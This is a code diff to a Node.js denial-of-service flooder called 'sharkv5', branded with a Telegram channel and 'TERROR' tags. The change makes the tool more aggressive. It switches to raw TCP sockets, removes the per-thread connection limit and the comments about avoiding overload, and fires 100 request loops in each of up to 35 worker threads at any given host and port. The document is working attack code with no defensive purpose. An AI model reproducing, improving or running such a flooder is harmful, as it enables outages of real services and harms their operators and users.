@@ -1,12 +1,10 @@
-const http = require('http');
+const net = require('net');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
-const net = require('net');
 
 const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
 const THREADS_MIN = 15;
 const THREADS_MAX = 35;
-const MAX_CONN_PER_THREAD = 25; // lowered to reduce overload
 const LIVE_REFRESH_RATE = 100;
 
 let totalRequests = 0;
@@ -27,29 +25,25 @@ function randomUA() {
 
 if (isMainThread) {
   if (process.argv.length < 4) {
-    console.error("Usage: node sharkv5.js <target> <duration_sec>");
+    console.error("Usage: node sharkv5-v3.js <host:port> <duration_sec>");
     process.exit(1);
   }
 
-  const target = process.argv[2];
+  const [host, port] = process.argv[2].split(':');
   const duration = parseInt(process.argv[3]);
   end = Date.now() + duration * 1000;
 
   let activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
   for (let i = 0; i < activeThreads; i++) {
-    new Worker(__filename, { workerData: { target, duration } });
+    new Worker(__filename, { workerData: { host, port, duration } });
   }
 
-  // Dynamic thread count update every 20s
   setInterval(() => {
-    activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
     maxRps = Math.max(maxRps, rpsLastSecond);
     rpsLastSecond = 0;
-  }, 20000);
+  }, 1000);
 
-  setInterval(() => {
-    renderStats();
-  }, LIVE_REFRESH_RATE);
+  setInterval(() => renderStats(), LIVE_REFRESH_RATE);
 
   function renderStats() {
     const remaining = Math.max(0, end - Date.now());
@@ -60,7 +54,7 @@ if (isMainThread) {
     readline.clearScreenDown(process.stdout);
     console.log(`SHARKV5 - T.ME/STSVKINGDOM`);
     console.log(`==============================`);
-    console.log(`total: ${successCount + errorCount}`);
+    console.log(`total: ${totalRequests}`);
     console.log(`max-r: ${maxRps}`);
     console.log(`==============================`);
     console.log(`succes: ${successCount}`);
@@ -69,63 +63,58 @@ if (isMainThread) {
     console.log(`REMAINING: ${mins}:${secs < 10 ? '0' : ''}${secs}`);
   }
 
-  // Stats IPC server
   const server = net.createServer(socket => {
     socket.on('data', data => {
       const msg = data.toString();
       if (msg === 'ok') {
         successCount++;
+        totalRequests++;
         rpsLastSecond++;
       } else if (msg === 'err') {
         errorCount++;
+        totalRequests++;
       }
     });
   });
   server.listen(9999);
 
 } else {
-  const { target, duration } = workerData;
+  const { host, port, duration } = workerData;
   const endTime = Date.now() + duration * 1000;
-  const socket = net.connect(9999, '127.0.0.1');
-  const sendStat = msg => socket.write(msg);
+  const control = net.connect(9999, '127.0.0.1');
+  const notify = msg => control.write(msg);
 
-  // Agent reused to avoid overhead
-  const agent = new http.Agent({ keepAlive: true, maxSockets: 10 });
+  function createRawRequest() {
+    return [
+      `GET / HTTP/1.1`,
+      `Host: ${host}`,
+      `User-Agent: ${randomUA()}`,
+      `Connection: close`,
+      `\r\n`
+    ].join('\r\n');
+  }
 
   function flood() {
     if (Date.now() > endTime) return;
+    const socket = new net.Socket();
 
-    const options = {
-      agent,
-      method: 'GET',
-      headers: {
-        'User-Agent': randomUA(),
-        'Accept': '*/*',
-        'Connection': 'keep-alive',
-        'Pragma': 'no-cache',
-        'Cache-Control': 'no-cache'
+    socket.connect(port, host, () => {
+      try {
+        socket.write(createRawRequest());
+        notify('ok');
+      } catch {
+        notify('err');
       }
-    };
+      socket.destroy();
+    });
 
-    try {
-      const req = http.request(target, options, res => {
-        // Consume data to avoid memory leak
-        res.on('data', () => {});
-        res.on('end', () => sendStat('ok'));
-      });
+    socket.on('error', () => {
+      notify('err');
+    });
 
-      req.on('error', () => sendStat('err'));
-      req.end();
-    } catch {
-      sendStat('err');
-    }
-
-    // Flood as fast as possible, but with small delay to prevent overload
-    setTimeout(flood, 0);
+    setImmediate(flood);
   }
 
-  // Start limited concurrent requests per thread
-  for (let i = 0; i < MAX_CONN_PER_THREAD; i++) {
-    flood();
-  }
+  // Launch 100 fire-and-forget loops
+  for (let i = 0; i < 100; i++) flood();
 }
